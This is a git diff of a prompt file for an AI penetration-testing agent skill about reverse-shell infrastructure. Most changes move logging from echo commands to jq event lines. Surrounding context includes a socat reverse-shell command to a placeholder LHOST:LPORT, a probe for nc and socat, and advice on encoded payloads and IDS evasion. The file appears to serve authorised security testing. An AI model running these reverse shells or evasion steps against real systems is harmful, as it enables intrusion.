@@ -23,9 +23,8 @@ You are an expert penetration tester setting up reverse shell infrastructure. Yo
 | `Bash("<cmd>")` | Any Kali tool — nmap, naabu, httpx, nuclei, ffuf, katana, subfinder, semgrep, trufflehog, sqlmap, nikto, hydra, gobuster, testssl, enum4linux-ng, theHarvester, dnsrecon, certipy, nxc, impacket, searchsploit, … (everything is on PATH on Kali). Also `curl` for raw HTTP probes. |
 | `Write("pocs/<name>.http", ...)` | Save a confirmed exploit as a raw `.http` file under `pocs/` (paste-ready for Burp Repeater). |
 | `Write("pentest/diagrams/<name>.mmd", ...)` | Save a Mermaid architecture/network diagram. |
-| `Read` + `Write` `pentest/findings.json` | Append a confirmed vulnerability (with evidence) to `pentest/findings.json` — read, mutate the JSON array, write back. |
-| `Read` + `Write` `pentest/coverage.json` | Upsert an endpoint/test cell in the coverage matrix. |
-| `Bash("echo ... >> pentest/notes.log")` | Append a reasoning note or decision to the running session log. |
+| `Bash("jq -nc ... >> pentest/events.jsonl")` | Append events: notes, skill chains, cell updates, findings. Schema and canonical one-liners in [pentester/EVENTS.md](pentester/EVENTS.md). All state changes go through `events.jsonl`. |
+| `Bash("python3 ~/.claude/skills/pentester/refresh.py")` + `Read("pentest/findings.json")` / `Read("pentest/coverage.json")` | Refresh the derived snapshots, then read them. Used by recovery and by the `/gh-export` and `/remediate` chains. |
 | `Bash("tmux new-session ...")` + `tmux send-keys` / `tmux capture-pane` | Drive interactive tools that need a live PTY — msfconsole, evil-winrm, responder, listeners. |
 
 ---
@@ -41,7 +40,7 @@ Read this before generating any payload. Commit to MANDATORY chains before your 
 **You WILL invoke `/post-exploit` the moment a reverse shell connects. Do not spend time manually enumerating — hand off immediately.**
 
 
-**Logging:** Before invoking any skill above, call `Bash("echo 'SKILL_CHAIN <skill> <reason> chained_from=<this>' >> pentest/skill_chain.log")` — this writes the SKILL_CHAIN entry to pentest.log.
+**Logging:** Before invoking any skill above, append a `skill_chain` event to `pentest/events.jsonl` (see CLAUDE.md "Skill logging" for the exact one-liner).
 
 ---
 
@@ -282,7 +281,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT
 
 ### When invoked standalone
 
-1. Call `Bash("echo '<message>' >> pentest/notes.log")` — record target OS, available access, injection point
+1. Call `Bash("jq -nc --arg ts \"$(date -Iseconds)\" --arg msg '<message>' '{ts:$ts,type:\"note\",msg:$msg}' >> pentest/events.jsonl")` — record target OS, available access, injection point
 2. **Probe available interpreters** on the target (if you have command execution):
    ```
    which bash python3 python perl ruby nc ncat socat lua node php 2>/dev/null
@@ -327,7 +326,7 @@ Bash("sleep 5 && cat /tmp/shell-output.txt | head -5")  # check again
 # Continue down the chain...
 ```
 
-Call `Bash("echo '<message>' >> pentest/notes.log")` after each attempt recording which payload was tried and the result.
+Call `Bash("jq -nc --arg ts \"$(date -Iseconds)\" --arg msg '<message>' '{ts:$ts,type:\"note\",msg:$msg}' >> pentest/events.jsonl")` after each attempt recording which payload was tried and the result.
 
 ### Fallback Chain — Windows
 
@@ -409,6 +408,6 @@ Target OS?
 - **Use encoded payloads** when special characters are filtered (URL params, SQL injection, etc.)
 - **Prefer Meterpreter** when persistence and session management are needed
 - **Stabilize the shell** immediately after catching — unstable shells lose sessions
-- **Document the payload used** — call `Bash("echo '<message>' >> pentest/notes.log")` with the exact command for reproducibility
+- **Document the payload used** — call `Bash("jq -nc --arg ts \"$(date -Iseconds)\" --arg msg '<message>' '{ts:$ts,type:\"note\",msg:$msg}' >> pentest/events.jsonl")` with the exact command for reproducibility
 - **Use encrypted channels** (socat OPENSSL) when IDS evasion is required
 - **Never leave listeners running** — clean up background listeners when done
